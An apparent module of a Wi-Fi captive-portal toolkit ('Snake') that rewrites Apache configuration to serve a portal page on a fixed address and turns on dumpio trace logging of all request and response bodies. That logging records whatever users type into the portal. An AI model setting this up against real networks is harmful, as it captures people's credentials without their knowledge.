#!/usr/bin/env python3


import sys
import os
import subprocess
from subprocess import PIPE

Status_Path = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package/log_access.log"
LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
Cap_port_Path = '/var/www/Captive_Portal'
head_file,replaceheadfile = "<VirtualHost *:80>",'<VirtualHost 172.170.250.49:80>'
Root_Web      = "DocumentRoot /var/www/html"
New_Root_Web  = "#DocumentRoot /var/www/html"+'\n'+"        DocumentRoot "+ Cap_port_Path
Header = "#Snake_web_Portal"+'\n'+' <Directory "'+Cap_port_Path+'">'
Header2 = '#<Directory /var/www/>'+'\n'+'<Directory '+Cap_port_Path+'>'
line_replace = '<Directory /var/www/>'
log_access , log_error , OInput ,OOutput , LogLevel = "CustomLog "+LOG_PATH+"/ServerLog/log_access.log",\
"ErrorLog "+LOG_PATH+"/ServerLog/log_error.log",\
"DumpIOInput on","DumpIOOutput on","LogLevel dumpio:trace7"
logpatherror , replace_logerror = "ErrorLog ${APACHE_LOG_DIR}/error.log","#ErrorLog ${APACHE_LOG_DIR}/error.log"+'\n'+'        '+log_error
logpathaceess , replacelogpathaccess = "CustomLog ${APACHE_LOG_DIR}/access.log",'#CustomLog ${APACHE_LOG_DIR}/access.log '+\
'\n'+'        '+log_access
endfile = '#Include conf-available/serve-cgi-bin.conf'
enfreplace = endfile+'\n'+'        '+OInput+'\n'+'        '+OOutput+'\n'+'        '+LogLevel
with open ("/etc/apache2/sites-available/000-Porat.conf",'w') as conf_do:
    pass
class Captive_Portal:
      if os.path.exists('/etc/apache2/apache2.conf.bck'):
        pass
      else:  
          with open('/etc/apache2/apache2.conf' ,'r') as copydefulit , \
          open('/etc/apache2/apache2.conf.bck','w') as writecopy:
                writecopy.write(copydefulit.read())
          with open (str(os.path.dirname(__file__))+'/resources/apache2_Captive_Portal.txt','r') as addConfig:
               addConfig = addConfig.read()
          with open('/etc/apache2/apache2.conf' ,'w') as CaptivePortalConfig:
              CaptivePortalConfig = CaptivePortalConfig.write(addConfig)     
      def __init__(self):
         self.Check_Status()
      def Captive_Pr_Set(self):
                   print("[*] Captive Portal Mode in processing ....Done !!")
                   with open ("/etc/apache2/sites-available/000-default.conf",'r') as FILE_RE :
                        FILE_RE_ACT  = FILE_RE.readlines()
                   for line in FILE_RE_ACT : 
                            line= line.replace(head_file,replaceheadfile)                              
                            line = line.replace(Root_Web,New_Root_Web)
                            line = line.replace(logpatherror,replace_logerror)
                            line = line.replace(logpathaceess,replacelogpathaccess)
                            line = line.replace(endfile,enfreplace)
                            with open ("/etc/apache2/sites-available/000-default.txt",'a') as write_output:
                                 write_output_F = write_output.write(line) 
                   os.system("sudo a2enmod rewrite >/dev/null 2>&1")
                   with open ("/etc/apache2/sites-available/000-default.txt",'r') as read_output:
                             read_out = read_output.read()                        
                        
                   with open(str(os.path.dirname(__file__))+'/resources/rpache-rewrite.txt','r') as rpacherewrite :
                                  read_cont = rpacherewrite.read()
                   with open ("/etc/apache2/sites-available/000-Porat.conf",'w') as config_server :
                             wireapacche = config_server.write( read_out+Header+read_cont)
                  # with open("/etc/apache2/apache2.conf",'r') as Config_FIE :
                  #          Read_Config_FILE = Config_FIE.readlines()
                  #         for line in Read_Config_FILE :                               
                  #             line = line.replace(line_replace,Header2)
                  #             with open ("/etc/apache2/apache2conf.txt",'a') as write_Config:
                  #                  write_output_F2 = write_Config.write(line) 
                  # with open ("/etc/apache2/apache2conf.txt",'r') as Reread_Config: 
                  #           Read_Info = Reread_Config.read()
                  # with open("/etc/apache2/apache2.conf",'w') as write_Config_FIE :
                  #           Copy_Info = write_Config_FIE.write(Read_Info +'\n'+'ServerName  127.0.0.1')
                   command1 = 'sudo a2enmod dump_io >/dev/null 2>&1'
                   subprocess.call(command1,shell=True,stderr=subprocess.PIPE)
                   os.system('sudo systemctl reload httpd.service >/dev/null 2>&1')
                   os.system("systemctl restart apache2 >/dev/null 2>&1")
                   command = "sudo a2enmod dumpio >/dev/null 2>&1"
                   subprocess.call(command,shell=True,stderr=subprocess.PIPE)
                   command3 = 'sudo a2ensite 000-Porat.conf >/dev/null 2>&1'
                   subprocess.call(command3,shell=True,stderr=subprocess.PIPE)
                   os.remove("/etc/apache2/sites-available/000-default.txt")
                   #os.remove("/etc/apache2/apache2conf.txt")
                   print("[+] Captive Portal Server is Up...") 
                   with open("/etc/apache2/ports.conf" ,'r') as portset :
                     port = portset.read()
                     if "172.170.250.49:80" in port :
                         pass
                     else:    
                         with open(str(os.path.dirname(__file__))+'/resources/ports_Cp.txt','r') as portset :
                             port = portset.read() 
                         with open ("/etc/apache2/ports.conf" ,'w') as portset :  
                              portset.write(port) 
                   os.system("systemctl restart apache2 >/dev/null 2>&1")  
      def Check_Status(self):         
            with open ("/etc/apache2/sites-available/000-Porat.conf",'r') as config_server :
                 read_config = config_server.read()
            if "#Snake_web_Portal"  in read_config and Status_Path in read_config : 
                     os.system("systemctl restart apache2 >/dev/null 2>&1")
                     print("[+] Captive Portal Server is Up...") 
                     pass
            elif "#Snake_web_Portal"  in read_config and Status_Path not in  read_config :
                with open(os.path.dirname(__file__)+'/resources/000-default.conf.txt','r') as default_conf_txt :
                          OOO_default_conf_txt = default_conf_txt.read()
                with open("/etc/apache2/sites-available/000-Porat.conf",'w') as default_conf_read :
                          OOO_default_conf_write = default_conf_read.write(OOO_default_conf_txt)
               # with open(str(os.path.dirname(__file__))+'/resources/apache2.conf.txt','r') as apache2_conf :
                #          apache2_conf_txt = apache2_conf.read()
                #with open("/etc/apache2/apache2.conf",'w') as apache2_conf_write :
                 #         apache2_conf_write = apache2_conf_write.write(apache2_conf_txt)
                self.Captive_Pr_Set()
              
            else:   
                if "#Snake_web_Portal" not in read_config and Status_Path not in  read_config  :   
                   os.system("cat /etc/apache2/sites-available/000-default.conf > /etc/apache2/sites-available/000-default.bac")
                  # os.system("cat /etc/apache2/apache2.conf > /etc/apache2/apache2.bac")       
                   self.Captive_Pr_Set()
if __name__=='__main__':
   Captive_Portal()


